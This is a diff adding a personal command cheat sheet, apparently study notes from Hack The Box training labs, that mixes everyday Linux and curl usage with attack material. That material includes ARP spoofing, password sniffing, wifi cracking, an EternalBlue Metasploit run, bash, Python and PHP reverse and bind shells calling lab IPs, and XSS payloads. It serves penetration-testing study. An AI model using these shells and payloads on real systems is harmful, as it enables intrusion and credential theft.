@@ -1,0 +1,394 @@
++ Scan host: 
+  arp-scan --interface wlp1s0 192.168.1.0/24
+
++ Find http:
+  inurl: http
+
++ ARPspoofing:
+  arpspoof -i wlp1s0 -t 192.168.1.1 -r 192.168.1.101
+  net.ipv4.ip_forward=0
+
++ tcpdump find plaintext password/username:
+  tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user '
+
++ Crack wifi:
+  aircrack-ng -a2 -b A0:65:18:77:DE:19 -w wifi-chua-wordlist_baclv.txt truong.pcap
+
++ pcapng -> pcap:
+  tshark -F pcap -r truong.pcapng -w truong.pcap
+
++ turn on/off promiscious mode:
+  ifconfig wlp1s0 promisc
+  ifconfig wlp1s0 -promisc
+
++ unzip file:
+  unzip abc.zip
+
++ rename file:
+  mv impossible_password.bin a.bin
+
++ read *.exe/*.bin file
+  chmod +x file.bin
+  ./file.bin
+
++ connect to VPN:
+  openvpn k.ovpn
+
++ show vpn's ip:
+  copycat2090@htb[/htb]$ ip -4 a show tun0
+
++ ssh connect to server:
+  copymeow@htb[/htb]$ ssh Bob@10.10.10.10
+  Bob@remotehost's password: *********
+  Bob@remotehost#
+
++ Netsh connect to port:
+  copymeow@htb[/htb]$ netcat 10.10.10.10 22
+  SSH-2.0-OpenSSH_8.4p1 Debian-3
+
++ tmux screen:
+  We can also split a window vertically into panes by hitting the prefix and then [CTRL + %]
+  We can also split into horizontal panes by hitting the prefix and then [CTRL + "]
+
++ vim superkeys:
+  x	Cut character
+  dw	Cut word
+  dd	Cut full line
+  yw	Copy word
+  yy	Copy full line
+  p	Paste
+ go to the bottom
+  :1	Go to line number 1.
+  :w	Write the file, save
+  :q	Quit
+  :q!	Quit without saving
+  :wq	Write and quit
+
++ nmap scanner:
+  nmap 10.129.42.253
+  nmap -sV -sC -p- 10.129.42.253 (-sV perform version scan, -sC uses script, -p- scan all ports)
+  locate scripts/citrix
+  nmap --script <script name> -p<port> <host>. 
+  nmap -sV --script=banner <target>
+  nmap -sC -sV -p21 10.129.42.253
+
++ fpt connections:
+  ftp -p 10.129.42.253 
+
++ SMB information: 
+  nmap --script smb-os-discovery.nse -p445 10.10.10.40
+  nmap -A -p445 10.129.42.253
+
++ smbclient can enumerate and interact with SMB shares:
+  smbclient -N -L \\\\10.129.42.253 (The -L flag specifies that we want to retrieve a list of available shares on the remote
+  host, while -N suppresses the password prompt.)
+  smbclient \\\\10.129.42.253\\users (Connect to a user)
+  smbclient -U bob \\\\10.129.42.253\\users(Connect to a user's credentials)
+
++ snmp scan: 
+  snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
+  onesixtyone -c dict.txt 10.129.42.254(A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community 
+  strings such as the dict.txt file)
+
++ gobuster for web eumeration
+  gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
+
++ get files from github
+  copycat2090@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists
+
++ DNS subdomain emumeration
+  copycat2090@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists(SecLists GitHub repo, which contains many 
+  useful lists for fuzzing and exploitation)
+  copycat2090@htb[/htb]$ sudo apt install seclists -y
+  Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file. We will target the domain inlanefreight.com, 
+  the website for a fictional freight and logistics company.
+  gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+
++ We can use cURL to retrieve server header information from the command line
+  curl -IL https://www.inlanefreight.com
+
++ We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb.
+  whatweb 10.10.10.121
+
++ searchsploit for searching exploit on everythings:
+  copycat2090@htb[/htb]$ sudo apt install exploitdb -y
+  copycat2090@htb[/htb]$ searchsploit openssh 7.2
+
++ metaploit:
+  msfconsole
+  msf6 > search exploit eternalblue(has in4 about eternalblue)
+  msf6 > use exploit/windows/smb/ms17_010_psexec (to use eternalblue)
+  msf6 > show option(option to modify attack vector to target's information)
+  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40(target's IP)
+  msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0(wifi adapter)
+  msf6 exploit(windows/smb/ms17_010_psexec) > check(to check if target is vulnerable)
+  msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
++ reverse shell netcat:
+  nc -lvnp 1234  
+  -l      	Listen mode, to wait for a connection to connect to us.
+  -v	        Verbose mode, so that we know when we receive a connection.
+  -n       	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
+  -p 1234	Port number netcat is listening on, and the reverse connection should be sent to.
+
++ reverse shell bash:
+  bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+
++ bind shell bash:
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+
++ bind shell python:
+  python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
++ bind shell netcat:
+  nc 10.10.10.1 1234
+
++ Create TTY:
+  copycat2090@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")' (create STTY)
+  copycat2090@htb[/htb]$ fg (access netcat shell)
+
++ PEASS execution:
+  copycat2090@htb[/htb]$./linpeas.sh  
+
++ SSH keys finding in id_rsa and copy to machine and -i flag to login:
+  copycat2090@htb[/htb]$ vim id_rsa
+  copycat2090@htb[/htb]$ chmod 600 id_rsa
+  copycat2090@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
+
++ SSH public keys override when control user:
+  copycat2090@htb[/htb]$ ssh-keygen -f key
+
++ Wget to download files:
+  user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
+  
++ curl to download files:
+  curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+
++ scp to download files:
+  scp linenum.sh user@remotehost:/tmp/linenum.sh
+
++ base64 for file tranfering through firewall:
+  copycat2090@htb[/htb]$ base64 shell -w 0 (encode)
+  user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell (decode)
+
++ Validate file transfer by file and md5sum:
+  user@remotehost$ file shell(Validation)
+  md5sum shell (check at client and server)
+
++ Nmap scan 1000 default ports and output format files:
+  nmap -sV --open -oA nibbles_initial_scan <ip address>.
+
++ Nmap scan 1000 networks and output format files and use scripts scan:
+  nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
+
++ Nmap scan 1000 networks and output format files and use http-enum scripts scan:
+  copycat2090@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 
+
++ Check port service through netcat:
+  copycat2090@htb[/htb]$ nc -nv 10.129.42.190 80
+
++ reading XML files from website
+  curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
+
++ reverse shell example:
+  <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>(remote vulnerable php code execution)
+  nc -lvnp 9443(connect to "listener")
+  python3 -c 'import pty; pty.spawn("/bin/bash")'(Create TTY environment)
+
++ check routing table:
+  sudo netstat -rn
+
++ change SSH key and password:
+  ssh-keygen
+
++ unzip files into specific destination:
+  sudo unzip a.zip -d /var/www/html
+
++ XSS cookies:
+  #"><img src=/ onerror=alert(document.cookie)>
+
++ CSRF exploit:
+  "><script src=//www.example.com/exploit.js></script>
+
++ curl with -I to recieve response message:
+  curl -I https://academy.hackthebox.com
+
++ curl header:
+  curl -I -X GET https://www.inlanefreight.com
+
++ curl with verbosity:
+  curl http://inlanefreight.com/ -v
+
++ curl with authentication:
+  curl -u admin:password http://admin:password@inlanefreight.com/ -vvv
+
++ curl with authentication then redirection:
+  curl -u admin:password -L http://inlanefreight.com/
+
++ curl with paramater
+  curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'
+
++ curl with cookies
+  curl -d 'username=admin&password=password' -L --cookie-jar /dev/null  http://inlanefreight.com/login.php -v
+
++ access cookies files
+  curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt  http://inlanefreight.com/login.php
+  cat cookies.txt 
+
++ Send JSON data using cURL. This can be done by specifying the "application/json" header with the "-H" flag.
+  curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }' --cookie-jar /dev/null -L  http://inlanefreight.com/login.php
+
++ cURL - OPTIONS Request
+  curl -X OPTIONS http://inlanefreight.com/ -v
+
++ cURL - File Upload
+  echo "curl file upload!" > test.txt
+  curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv(upload file)
+  curl http://inlanefreight.com/test.txt
+
++ cURL - DELETE Method
+  curl -X DELETE http://inlanefreight.com/test.txt -vv
+  curl http://inlanefreight.com/test.txt
+
++ POST request cURL with -s: 
+  suppi147@htb[/htb]$ curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"( "-s" flag to reduce cluttering the response with unnecessary data)
+
++ Base64 encode and decode:
+  suppi147@htb[/htb]$ echo https://www.hackthebox.eu/ | base64
+  suppi147@htb[/htb]$ echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d
+
++ hex encode and decode:
+  suppi147@htb[/htb]$ echo https://www.hackthebox.eu/ | xxd -p
+  suppi147@htb[/htb]$ echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r
+
++ rot13 encode and decode:  
+  suppi147@htb[/htb]$ echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+  suppi147@htb[/htb]$ echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
++ how to run js:
+  node file.js
+
++ Unzip to specific path:
+  sudo unzip -d /var/www/html/ file.zip
+
++ start apache2 web server:
+  service apache2 start
+
++ start mysql:
+  service mysql start
+  sudo apt-get install mariadb-server(if mysql is not there)
+
++ discovery tools usability:
+  man curl
+  curl -h
+  apropos curl
+
++ display system's information:
+  uname -a
+
++ find path for shell:
+   echo "$SHELL"
+
++ find path for mail:
+   echo "$MAIL"
+
++ mount in to E drive in Ubuntu terminal on Windows:
+  cd /mnt/e
+
++ list installed packages
+  apt list --installed
+
++ DPGK
+  wget http://archive.ubuntu.com/ubuntu/pool/main/s/strace/strace_4.21-1ubuntu1_amd64.deb
+  sudo dpkg -i strace_4.21-1ubuntu1_amd64.deb
+
++ Change MAC address: 
+  ip link set dev wlp1s0 down
+  ip link set dev wlp1s0 address 11:22:33:44:33:66
+  ip link set dev wlp1s0 up
+
++ How to find a PID of a process:
+  ps aux | grep {process-name}
+
++ List all running process:
+  systemctl list-units --type=service
+
++ move out
+  cd -
+
++ see inode number
+  ls -i
+
++ see hiden files
+  ls -a
+
++ create empty file
+  touch example.txt
+
++ tree
+  tree -a
+
++ find last modified files
+  ls -t
+
++ find module location
+  which python3
+
++ redirect STDERR result to null device and discard all data
+  find /etc/ -name shadow 2>/dev/null
+
++ redirect STDERR result to a file
+  find /etc/ -name shadow > text.txt
+
++ redirect STDERR result to a file and not overriding it but adding to it
+  find /etc/ -name shadow >> text.txt
+
++ see first 10 lines
+  head /etc/shadow
+
++ see last 10 lines
+  tail /etc/shadow
+
++ exclude result print
+  cat /etc/passwd | grep -v "false\|nologin"
+ 
++ print without a character
+  cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
+
++ print replace with a character
+  cat /etc/passwd | grep -v "false\|nologin" | tr ":" " "
+
++ print in column
+  cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " |column -t
+
++ print only the first and the last content
+  cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | awk '{print $1, $NF}'
+
++ print with content replace
+  suppi147@htb[/htb]$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | awk '{print $1, $NF}' | sed 's/bin/HTB/g'
+
++ search for listening service except lo interface 
+  ss -l -4 |grep -v "127\.0\.0" | grep "LISTEN"| wc -l
+
++ spider a website
+  wget --spider --recursive https://www.inlanefreight.com(broken links + files)
+  curl https://www.inlanefreight.com/ | grep -Po 'https://www.inlanefreight.com/\K[^"\x27]+' | sort -u  
+
+  curl https://www.inlanefreight.com --insecure > ilf
+  cat ilf | grep "https://www.inlanefreight.com" > ilf.1
+  cat ilf.1 | tr " " "\n" | sort | grep "inlanefreight.com" | cut -d'"' -f2 | sort | cut -d"'" -f2 | sort | uniq -c > ilf.2
+  cat ilf.2
+
++ We can then apply read permissions for all users
+  chmod a+r shell
+
++ We can also set the permissions for all other users to read only using the octal value assignment.
+  chmod 754 shell
+
++ To change the owner and/or the group assignments of a file or directory, we can use the chown command
+  chown <user>:<group> <file/directory>
+  chown root:root shell
+
++ update
+  apt update && apt dist-upgrade
